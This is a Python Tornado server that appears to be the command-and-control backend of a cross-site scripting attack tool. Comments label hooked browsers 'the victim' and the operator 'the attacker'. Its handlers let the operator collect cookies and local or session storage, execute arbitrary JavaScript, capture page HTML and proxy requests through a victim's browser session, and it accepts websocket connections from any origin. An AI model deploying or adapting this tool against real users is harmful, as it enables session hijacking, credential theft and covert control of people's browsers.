#!/usr/bin/env python
# encoding: utf-8

import logging
import tornado.escape
import tornado.ioloop
import tornado.options
import tornado.web
import tornado.websocket
import os.path
import uuid
import queue
import threading
import re
from urllib.parse import urlparse

from tornado.options import define, options

define("port", default=8888, help="run on the given port", type=int)
define("debug", default=True, help="enables debug mode", type=bool)

class Application(tornado.web.Application):
    def __init__(self, **kwargs):
        handlers = [
            (r"/", MainHandler),
            (r"/client/([0-9a-f\-]+)", ClientHandler),
            (r"/client/([0-9a-f\-]+)/([a-z]+)", ClientHandler),
            (r"/clientsocket", ClientSocketHandler),
            (r"/serversocket", ServerSocketHandler),
        ]
        settings = dict(
            #cookie_secret="__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__",
            template_path=os.path.join(os.path.dirname(__file__), "templates"),
            static_path=os.path.join(os.path.dirname(__file__), "static"),
            xsrf_cookies=False,
        )
        settings.update(kwargs)
        tornado.web.Application.__init__(self, handlers, **settings)


class ProxyApplication(tornado.web.Application):
    def __init__(self, client, host):
        handlers = [
            (r"/(.*)", ProxyHandler),
        ]
        self.host = host
        self.client = client
        logging.info("new proxy for host %s over client %s" % (host, client.id))
        super(ProxyApplication, self).__init__(handlers)

class ProxyHandler(tornado.web.RequestHandler):
    def __init__(self, *args, **kwargs):
        super(ProxyHandler, self).__init__(*args, **kwargs)
        self.application.client.request_queue = {}

    def _request(self, method, path, body=None):
        url = "%s/%s" % (self.application.host, path)
        self.application.client.request_queue[url] = queue.Queue()
        self.application.client.send('request', {
                'method' : method,
                'url' : url,
                'body' : body
            })
        return url

    @tornado.web.asynchronous
    def get(self, path):
        idx = self._request("GET", path)

        class RespWaiter(threading.Thread):
            def __init__(self, idx):
                super(RespWaiter, self).__init__()
                self.idx = idx

            def run(self2):
                try:
                    resp = self.application.client.request_queue[self2.idx].get(True, 10)
                    if resp:
                        logging.debug("result received for %s" % (path,))
                        html = self.application.client.replace_images(resp['body'], resp['images'])
                        self.write(html)
                except queue.Empty:
                    logging.debug("timeout for %s" % (path,))
                    self.write("<h1>Timeout</h1>")
                try:
                    del self.application.client.request_queue[self2.idx]
                finally:
                    self.finish()

        RespWaiter(idx).start()




class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("index.html")

class ClientHandler(tornado.web.RequestHandler):
    """Handles the interactions with the console"""

    def _get_client(self, client_id):
        for c in MessageSocketHandler.waiters:
            if c.id == client_id:
                return c
        return None

    def get(self, client_id, command=None):
        client = self._get_client(client_id)
        self.render("client.html", client=client)

    def post(self, client_id, command):
        client = self._get_client(client_id)

        if hasattr(self, 'on_' + command):
            getattr(self, 'on_' + command)(client)

    def on_alert(self, client):
        client.write_message({
                'command' : 'alert',
                'data' : self.get_argument('message')
                });

    def on_prompt(self, client):
        logging.info("request answer for " + self.get_argument('message'))
        self.send(client, 'prompt',
                {
                    'msg' : self.get_argument('message'),
                })
        self.write("Requested")

    def on_cookies(self, client):
        self.send(client, 'cookie')

    def on_execute(self, client):
        self.send(client, 'execute', self.get_argument('code'))

    def on_view(self, client):
        self.send(client, 'view')

    def on_storage(self, client):
        self.send(client, 'storage', self.get_argument('type'))

    def send(self, client, command, data=None):
        client.send(command, data, self.get_argument('req_id'))

    def send_server(self, command, data=None):
        ServerSocketHandler.send(command, data, self.get_argument('req_id'))

    def on_request(self, client):
        p = ProxyApplication(client, self.get_argument('url'))
        port = 9000
        while True:
            try:
                p.listen(port)
                break
            except:
                port += 1
        self.send_server('callback', ['http://localhost:%d/' % (port,)])

class MessageSocketHandler(tornado.websocket.WebSocketHandler):
    waiters = set()
    cache = []
    cache_size = 200

    def allow_draft76(self):
        # for iOS 5.0 Safari
        return True

    def check_origin(self, origin):
        return True

    def open(self):
        logging.info("new client")
        MessageSocketHandler.waiters.add(self)

    def on_close(self):
        MessageSocketHandler.waiters.remove(self)

    def on_message(self, message):
        logging.info("got message %r", message)
        parsed = tornado.escape.json_decode(message)
        if 'command' in parsed:
            command = parsed['command'].lower()
            data = parsed['data'] if 'data' in parsed else None
            req_id = parsed['req_id'] if 'req_id' in parsed else None
            if hasattr(self, 'on_' + command):
                getattr(self, 'on_' + command)(data, req_id)
            elif hasattr(self, command + '_queue'):
                queue = getattr(self, command + '_queue')
                url = data.get('url')
                logging.debug("putting response in queue %s", url)
                if queue is not None:
                    if isinstance(queue, dict):
                        if url in queue:
                            queue[url].put(data)
                    else:
                        queue.put(data)
            elif data and req_id:
                if isinstance(data, dict):
                    args = data['args'] if 'args' in data else [data]
                else:
                    args = [data]
                logging.info("got callback[%s] (%r)" % (req_id, args,))
                ServerSocketHandler.send('callback', args, req_id)

    def send(self, command, data):
        self.write_message({
                'command' : command,
                'data' : data
            })


class ClientSocketHandler(MessageSocketHandler):
    """Handles the connection to the victim"""

    def on_close(self):
        super(ClientSocketHandler, self).on_close()
        ServerSocketHandler.client_update()

    def on_welcome(self, data, req_id):
        self.id = str(uuid.uuid4())
        self.ua = self.request.headers.get('User-Agent')
        self.ip = self.request.remote_ip
        self.url = data['url']
        self.write_message({
            'command' : 'welcome',
            'data' : self.id
                })
        ServerSocketHandler.client_update()

    def on_cookie(self, data, req_id):
        if not data:
            cookies = []
        else:
            cookies = [cookie.strip().split('=', 1) for cookie in data.split(';')]
        logging.info("got cookies %r" % (cookies,))
        ServerSocketHandler.send('callback', [cookies], req_id)

    def on_execute(self, data, req_id):
        ServerSocketHandler.send('callback', [data], req_id);

    def on_view(self, data, req_id):
        html = re.sub('<script.+?</script>', '', data['html'], re.IGNORECASE | re.DOTALL)

        html = self.replace_images(html, data['images'])

        ServerSocketHandler.send('callback', [html], req_id)

    def on_storage(self, data, req_id):
        ServerSocketHandler.send('callback', [data], req_id)

    def to_dict(self):
        return { k:v for k,v in self.__dict__.items() if k in (
            'id','ua','ip','url')}

    def replace_images(self, html, images):
        url = urlparse(self.url)
        for src, imgdata in images.items():
            while src not in html:
                src = src.split('/', 1)[1]
            html = html.replace(src, imgdata)
            if "./" + imgdata in html:
                html = html.replace("./" + imgdata, imgdata)

            #parsed_src = urlparse(src)
            #if parsed_src.netloc == url.netloc:
            #    html = html.replace(path, imgdata)

        return html

    def send(self, command, data=None, req_id=None):
        logging.info("Send command %s with data %r to client (%s)" % (command, data, req_id))
        self.write_message({
                'command' : command,
                'req_id' : req_id,
                'data' : data
            })


class ServerSocketHandler(MessageSocketHandler):
    """Handles the connection to the attacker"""
    server = None

    def open(self):
        logging.info("new Master")
        ServerSocketHandler.server = self
        ServerSocketHandler.client_update()

    def on_close(self):
        logging.info("master gone")
        ServerSocketHandler.server = None

    @classmethod
    def client_update(cls):
        logging.info("Updating client list")
        cls.send('client_list',
                [w.to_dict() for w in MessageSocketHandler.waiters])

    @classmethod
    def send(cls, command, data, req_id=None):
        if not ServerSocketHandler.server:
            logging.warning("No master connected")
            return
        if req_id:
            logging.info("Send command %s with data %r and req_id %s to server" % (command, data, req_id))
            ServerSocketHandler.server.write_message({
                'command' : command,
                'data' : data,
                'req_id' : req_id
            })
        else:
            logging.info("Send command %s with data %r to server" % (command, data))
            ServerSocketHandler.server.write_message({
                'command' : command,
                'data' : data,
            })

def main():
    tornado.options.parse_command_line()
    app = Application(debug=options.debug)
    print("Listen on 127.0.0.1:{}".format(options.port))
    app.listen(options.port)
    print("running on {}".format(options.port))
    tornado.ioloop.IOLoop.instance().start()

if __name__ == '__main__':
    main()
